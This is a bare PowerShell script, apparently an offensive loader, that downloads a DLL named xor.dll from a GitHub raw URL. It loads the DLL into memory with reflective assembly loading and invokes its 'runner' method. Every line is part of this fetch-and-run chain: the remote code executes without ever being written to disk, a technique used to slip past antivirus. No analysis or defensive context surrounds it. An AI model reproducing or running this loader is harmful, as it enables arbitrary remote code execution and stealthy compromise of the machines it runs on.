$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/gravymartyr/chrombus/raw/main/xor.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)